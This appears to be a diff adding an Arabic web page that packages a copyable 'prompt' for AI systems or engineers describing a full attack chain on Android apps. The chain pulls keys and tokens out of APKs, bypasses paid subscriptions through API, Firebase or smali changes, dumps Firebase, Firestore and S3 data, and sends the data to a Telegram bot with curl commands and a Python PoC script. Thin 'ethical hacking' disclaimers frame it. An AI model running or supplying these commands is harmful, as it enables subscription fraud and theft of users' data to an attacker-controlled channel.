@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>برومبت – تحويل الخطة المدفوعة إلى مجانية وسحب البيانات (هندسة أكاديمية)</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0b0f1a;
+            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+            padding: 2rem 1.5rem;
+            color: #eef2ff;
+        }
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            background: rgba(18, 28, 40, 0.85);
+            backdrop-filter: blur(4px);
+            border-radius: 2rem;
+            border: 1px solid #2d3e5f;
+            padding: 2rem;
+            box-shadow: 0 20px 35px -12px black;
+        }
+        h1 {
+            font-size: 1.8rem;
+            background: linear-gradient(135deg, #a5f3fc, #38bdf8);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.25rem;
+        }
+        .badge {
+            background: #1e2a3a;
+            border-radius: 30px;
+            padding: 0.2rem 1rem;
+            font-size: 0.75rem;
+            font-weight: 500;
+            color: #7aa2f7;
+            display: inline-block;
+            margin-bottom: 1rem;
+        }
+        .sub {
+            border-left: 3px solid #38bdf8;
+            padding-left: 1rem;
+            margin: 0.75rem 0 1.8rem 0;
+            color: #b9c7d9;
+        }
+        .step-card {
+            background: #0f172ad9;
+            border-radius: 1.5rem;
+            margin-bottom: 1.8rem;
+            border: 1px solid #25324d;
+            overflow: hidden;
+            transition: all 0.2s;
+        }
+        .step-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #0f172a;
+            padding: 1rem 1.5rem;
+            border-bottom: 1px solid #1e2a44;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+        .step-num {
+            background: #1e2a3e;
+            width: 34px;
+            height: 34px;
+            border-radius: 40px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: #38bdf8;
+            margin-right: 0.75rem;
+        }
+        .step-title {
+            font-weight: 600;
+            font-size: 1.2rem;
+            flex: 1;
+        }
+        .copy-btn {
+            background: #1e2a44;
+            border: none;
+            color: #cbd5e6;
+            padding: 0.4rem 1rem;
+            border-radius: 2rem;
+            font-size: 0.7rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+        .copy-btn:hover {
+            background: #2d3d60;
+            color: white;
+        }
+        .step-content {
+            padding: 1.5rem;
+            font-size: 0.9rem;
+            line-height: 1.55;
+            background: #0a0f1c;
+            border-top: 1px solid #1e2a44;
+        }
+        pre {
+            background: #010409;
+            padding: 1rem;
+            border-radius: 1rem;
+            overflow-x: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            margin: 1rem 0;
+            border: 1px solid #2d3e60;
+            position: relative;
+        }
+        .code-header {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 0.25rem;
+        }
+        .inline-code {
+            background: #1e2a44;
+            padding: 0.2rem 0.5rem;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 0.8rem;
+            color: #7dd3fc;
+        }
+        hr {
+            border-color: #25324d;
+            margin: 1rem 0;
+        }
+        .btn-copy-all {
+            background: #2c3e66;
+            border: none;
+            padding: 0.7rem 1.8rem;
+            border-radius: 2rem;
+            font-weight: 600;
+            color: white;
+            margin: 1rem 0;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-copy-all:hover {
+            background: #3b527b;
+        }
+        .footnote {
+            text-align: center;
+            font-size: 0.7rem;
+            color: #5b6e8c;
+            border-top: 1px solid #1e2a44;
+            padding-top: 1.5rem;
+            margin-top: 1rem;
+        }
+        @media (max-width: 700px) {
+            body { padding: 1rem; }
+            .container { padding: 1.2rem; }
+            .step-title { font-size: 1rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
+        <div>
+            <h1>🔓 برومبت هندسي متكامل</h1>
+            <div class="badge">اختراق أخلاقي – خطة برو مجانية ← سحب بيانات ← تليغرام</div>
+        </div>
+        <button class="btn-copy-all" id="copyFullPromptBtn">📋 نسخ البرومبت الكامل (لـ AI / مهندس)</button>
+    </div>
+    <div class="sub">🎯 التسلسل العملي من استخراج المفاتيح إلى تعديل الاشتراك وسحب البيانات وإرسالها إلى بوت تلغرام (بيئة أكاديمية مرخصة)</div>
+
+    <div id="stepsContainer"></div>
+
+    <div class="footnote">
+        ⚠️ الاستخدام الأكاديمي فقط – تنفيذ هذه الخدمة يتطلب موافقة مسبقة ضمن اختبار الاختراق الأخلاقي.
+    </div>
+</div>
+
+<script>
+    // الخطوات التفصيلية (التسلسل الهندسي الحقيقي)
+    const steps = [
+        {
+            title: "1. استخراج العناوين والمفاتيح من APK",
+            content: `**الأدوات:** apktool, jadx-gui, strings, grep.
+**الإجراءات العملية:**
+- فك التطبيق: \`apktool d target.apk -o source\`
+- البحث عن عناوين API السحابية:
+  \`grep -r -E "https?://[a-zA-Z0-9./?=_-]*" source/ | grep -i "api\|firebase\|database\|cloud"\`
+- استخراج google-services.json (إن وجد):
+  \`unzip target.apk google-services.json\`
+  \`cat google-services.json | jq '.project_info'\`
+- استخراج مفاتيح Firebase RTDB / Firestore:
+  \`grep -r "api_key" source/ | grep -o '"api_key":"[^"]*"'\`
+- استخراج التوكنات الثابتة أو JWTs من smali:
+  \`grep -r "const-string" source/smali/ | grep -i "token\|bearer\|authorization"\`
+- **الهدف:** الحصول على (project_id, api_key, auth tokens, database URL).`
+        },
+        {
+            title: "2. تحليل آلية الاشتراك (Pro / Premium)",
+            content: `**المنطق التقني:** معظم التطبيقات تتحقق من صلاحية "pro" عبر:
+- حقل في قاعدة البيانات (مثلاً \`/users/{uid}/is_premium\`).
+- حقل في JWT أو توكن مخصص.
+- طلب HTTP إلى endpoint مثل \`/api/me/subscription\`.
+
+**خطوات التحليل:**
+- تفكيك الكود والبحث عن:
+  \`is_premium\`, \`isPro\`, \`subscription\`, \`plan\`, \`"free"\`, \`"pro"\`
+- تتبع طلبات الشبكة باستخدام Burp Suite أو Frida:
+  \`java -jar burpsuite.jar\` ثم تكوين الـ proxy على الجهاز.
+- تحديد الـ endpoint المسؤول عن جلب بيانات المستخدم:
+  مثال: \`GET /v1/user/subscription\` مع إرجاع JSON.
+
+**الهدف:** معرفة آلية التحقق لتتمكن من تعديل القيمة (client‑side أو server‑side).`
+        },
+        {
+            title: "3. تعديل الخطة المدفوعة إلى مجانية (Pro → Free bypass)",
+            content: `**السيناريو الأول (ثغرة منطقية في API):**
+- استخدام التوكن المستخرج مسبقاً.
+- إرسال طلب PUT/PATCH لتعديل بيانات المستخدم:
+  \`curl -X PATCH "https://api.target.com/v1/user/me" -H "Authorization: Bearer TOKEN" -d '{"plan":"pro"}'\`
+- إذا كان الخادم لا يتحقق من الصلاحية، سيتم الترقية فوراً.
+
+**السيناريو الثاني (تعديل قاعدة البيانات مباشرة):**
+- إذا كان التطبيق يستخدم Firebase Realtime Database:
+  \`curl -X PUT "https://PROJECT_ID.firebaseio.com/users/USER_ID.json?auth=TOKEN" -d '{"is_premium": true}'\`
+
+**السيناريو الثالث (Client‑Side bypass):**
+- إعادة تجميع التطبيق بعد تعديل smali:
+  البحث عن دالة \`isPremium()\` في smali وتغيير return value من 0 إلى 1.
+- استخدام \`apktool\` لإعادة البناء:
+  \`apktool b modified_source -o patched.apk\`
+- توقيع APK باستخدام uber-apk-signer.
+
+**الهدف:** تفعيل الميزات المدفوعة مجاناً.`
+        },
+        {
+            title: "4. سحب البيانات من قاعدة البيانات السحابية",
+            content: `**بعد الحصول على صلاحيات الوصول (مع التوكن):**
+- **Firebase Realtime Database**:
+  \`curl -X GET "https://PROJECT_ID.firebaseio.com/.json?auth=TOKEN" -o all_data.json\`
+- **Firestore**:
+  \`curl -H "Authorization: Bearer TOKEN" "https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents" -o firestore_data.json\`
+- **API ذاتية التطوير**:
+  استخدام endpoints مثل \`/api/users\`, \`/api/orders\`, \`/api/messages\` لجلب جميع السجلات (IDOR).
+- **استخراج الملفات من AWS S3** (في حال وجود مفاتيح AWS):
+  \`aws s3 cp s3://bucket-name/ ./downloaded_data --recursive\`
+
+**تنظيم البيانات:** استخدم \`jq\` لتصفية الحقول الحساسة (emails, tokens, passwords hashes).`
+        },
+        {
+            title: "5. إرسال البيانات إلى بوت تلغرام (Telegram Bot API)",
+            content: `**الخطوات لإرسال الملفات والبيانات إلى البوت:**
+- إنشاء بوت تلغرام عبر \`@BotFather\` والحصول على \`BOT_TOKEN\` و \`CHAT_ID\`.
+- استخدام curl لإرسال الملف:
+  \`curl -F "chat_id=CHAT_ID" -F "document=@all_data.json" "https://api.telegram.org/botBOT_TOKEN/sendDocument"\`
+- إرسال البيانات كنص إذا كانت صغيرة:
+  \`curl -X POST "https://api.telegram.org/botBOT_TOKEN/sendMessage" -d "chat_id=CHAT_ID&text=DATABASE_CONTENT"\`
+- **أتمتة العملية:** كتابة سكريبت بايثون يقرأ البيانات ويقسمها إلى أجزاء (بسبب حد 4096 حرف):
+  \`\`\`python
+  import requests
+  CHAT_ID = "12345"
+  BOT_TOKEN = "bot_token"
+  with open("all_data.json","r") as f:
+      data = f.read()
+  for i in range(0, len(data), 4000):
+      requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id":CHAT_ID,"text":data[i:i+4000]})
+  \`\`\`
+- **إرسال الملفات الكبيرة:** استخدام \`sendDocument\` مع \`multipart/form-data\`.`
+        },
+        {
+            title: "6. خطة متكاملة لتعديل الاشتراك وسحب البيانات تلقائياً (PoC)",
+            content: `**سكريبت تنفيذي شامل (بايثون):**
+\`\`\`python
+import requests, json
+
+# بيانات تم استخراجها مسبقاً
+PROJECT_ID = "xyz-firebase"
+TOKEN = "ya29.xxxxx"
+BOT_TOKEN = "724...:AAH..."
+CHAT_ID = "123456"
+
+# 1. تعديل الاشتراك إلى Pro
+url = f"https://{PROJECT_ID}.firebaseio.com/users/USER_ID.json?auth={TOKEN}"
+requests.patch(url, json={"plan": "pro", "is_premium": True})
+
+# 2. سحب جميع البيانات
+resp = requests.get(f"https://{PROJECT_ID}.firebaseio.com/.json?auth={TOKEN}")
+data = resp.json()
+
+# 3. إرسال البيانات إلى تلغرام
+for key, value in data.items():
+    msg = f"{key}: {str(value)[:500]}"
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
+\`\`\`
+**تنفيذ الخطوة بخطوة أمام اللجنة لإثبات النجاح.**`
+        },
+        {
+            title: "7. توثيق الإجراءات وتقديم التقرير النهائي",
+            content: `**التقرير يجب أن يتضمن:**
+- ملخص الثغرات المستغلة (نقاط الضعف في المصادقة، صلاحيات القاعدة البيانات).
+- لقطات شاشة للطلبات والردود قبل وبعد التعديل.
+- الكود المستخدم في السحب والتعديل والإرسال.
+- توصيات الإصلاح:
+  - استخدام Firebase App Check و Authentication القوية.
+  - التحقق من صحة التوكنات في كل طلب حساس.
+  - عدم تخزين المفاتيح في الـ client side.
+  - تمكين قواعد الأمان على مستوى قاعدة البيانات (validate على role).
+- إرفاق ملف JSON الذي تم سحبه كدليل.`
+        }
+    ];
+
+    function createCodeBlock(codeText, btnLabel = "📋 نسخ الأمر") {
+        const container = document.createElement("div");
+        container.style.marginBottom = "0.8rem";
+        const header = document.createElement("div");
+        header.className = "code-header";
+        const copyBtn = document.createElement("button");
+        copyBtn.className = "copy-btn";
+        copyBtn.innerHTML = btnLabel;
+        copyBtn.onclick = () => copyToClipboard(codeText, copyBtn);
+        header.appendChild(copyBtn);
+        const pre = document.createElement("pre");
+        const code = document.createElement("code");
+        code.innerText = codeText;
+        pre.appendChild(code);
+        container.appendChild(header);
+        container.appendChild(pre);
+        return container;
+    }
+
+    function copyToClipboard(text, btnElement) {
+        navigator.clipboard.writeText(text).then(() => {
+            const original = btnElement.innerHTML;
+            btnElement.innerHTML = "✅ تم النسخ!";
+            setTimeout(() => { btnElement.innerHTML = original; }, 1800);
+        }).catch(() => alert("فشل النسخ، حاول يدوياً."));
+    }
+
+    function renderSteps() {
+        const container = document.getElementById("stepsContainer");
+        container.innerHTML = "";
+        steps.forEach((step, idx) => {
+            const card = document.createElement("div");
+            card.className = "step-card";
+
+            const header = document.createElement("div");
+            header.className = "step-header";
+
+            const left = document.createElement("div");
+            left.style.display = "flex";
+            left.style.alignItems = "center";
+            const numSpan = document.createElement("span");
+            numSpan.className = "step-num";
+            numSpan.innerText = idx + 1;
+            const titleSpan = document.createElement("span");
+            titleSpan.className = "step-title";
+            titleSpan.innerText = step.title;
+            left.appendChild(numSpan);
+            left.appendChild(titleSpan);
+
+            const copyHeaderBtn = document.createElement("button");
+            copyHeaderBtn.className = "copy-btn";
+            copyHeaderBtn.innerHTML = "📋 نسخ هذه الخطوة";
+            copyHeaderBtn.onclick = () => {
+                copyToClipboard(`## ${step.title}\n\n${step.content}`, copyHeaderBtn);
+            };
+            header.appendChild(left);
+            header.appendChild(copyHeaderBtn);
+
+            const contentDiv = document.createElement("div");
+            contentDiv.className = "step-content";
+
+            // معالجة المحتوى: استخراج الأوامر المحاطة بـ ``` أو التي تبدأ بـ $
+            let raw = step.content;
+            let lines = raw.split('\n');
+            let inCode = false;
+            let codeBuffer = "";
+            let resultHtml = "";
+
+            for (let line of lines) {
+                if (line.trim().startsWith("```")) {
+                    if (inCode) {
+                        // نهاية كتلة كود
+                        if (codeBuffer.trim()) {
+                            const codeBlockDiv = createCodeBlock(codeBuffer.trim(), "📋 نسخ الكتلة");
+                            resultHtml += codeBlockDiv.outerHTML;
+                            codeBuffer = "";
+                        }
+                        inCode = false;
+                    } else {
+                        inCode = true;
+                    }
+                    continue;
+                }
+                if (inCode) {
+                    codeBuffer += line + "\n";
+                    continue;
+                }
+                // الأوامر التي تبدأ بـ $ أو علامة backtick
+                let trimmed = line.trim();
+                if (trimmed.startsWith("$ ")) {
+                    let cmd = trimmed.substring(2);
+                    const tempDiv = document.createElement("div");
+                    tempDiv.style.margin = "0.5rem 0";
+                    const btn = document.createElement("button");
+                    btn.className = "copy-btn";
+                    btn.style.marginRight = "0.5rem";
+                    btn.innerHTML = "📋 نسخ الأمر";
+                    btn.onclick = () => copyToClipboard(cmd, btn);
+                    const codeSpan = document.createElement("code");
+                    codeSpan.className = "inline-code";
+                    codeSpan.innerText = cmd;
+                    tempDiv.appendChild(btn);
+                    tempDiv.appendChild(codeSpan);
+                    resultHtml += tempDiv.outerHTML;
+                } else {
+                    resultHtml += line + "<br>";
+                }
+            }
+            if (codeBuffer.trim()) {
+                const codeBlockDiv = createCodeBlock(codeBuffer.trim(), "📋 نسخ الكتلة");
+                resultHtml += codeBlockDiv.outerHTML;
+            }
+            // إضافة زر نسخ النص الكامل للخطوة
+            const fullCopyBtn = document.createElement("button");
+            fullCopyBtn.className = "copy-btn";
+            fullCopyBtn.style.marginTop = "0.8rem";
+            fullCopyBtn.innerHTML = "📋 نسخ كل محتوى الخطوة (نصي)";
+            fullCopyBtn.onclick = () => copyToClipboard(step.content.replace(/`/g, '').replace(/\$ /g, ''), fullCopyBtn);
+            resultHtml += "<hr>";
+            resultHtml += fullCopyBtn.outerHTML;
+
+            contentDiv.innerHTML = resultHtml;
+            card.appendChild(header);
+            card.appendChild(contentDiv);
+            container.appendChild(card);
+        });
+    }
+
+    function getFullPrompt() {
+        let full = "# برومبت هندسي متكامل – خطة اختراق الاشتراك المدفوع وسحب البيانات وإرسالها إلى تلغرام\n\n";
+        full += "**الهدف الأكاديمي:** تحويل الخطة المدفوعة (Pro) إلى مجانية، وسحب قاعدة البيانات السحابية، ثم إرسال البيانات إلى بوت تلغرام، باستخدام مفاتيح وعناوين مستخرجة من APK.\n\n";
+        full += "## التسلسل العملي الكامل:\n\n";
+        steps.forEach((s, i) => {
+            full += `### ${i+1}. ${s.title}\n${s.content.replace(/`/g, '`').replace(/\*/g, '•')}\n\n`;
+        });
+        full += "\n**ملاحظة:** هذا البرومبت مخصص للتدريب العملي في مجال الهندسة العكسية والاختراق الأخلاقي ضمن بيئة مرخصة واختبارية.\n";
+        return full;
+    }
+
+    renderSteps();
+
+    document.getElementById("copyFullPromptBtn").addEventListener("click", function() {
+        copyToClipboard(getFullPrompt(), this);
+    });
+</script>
+</body>
+</html>
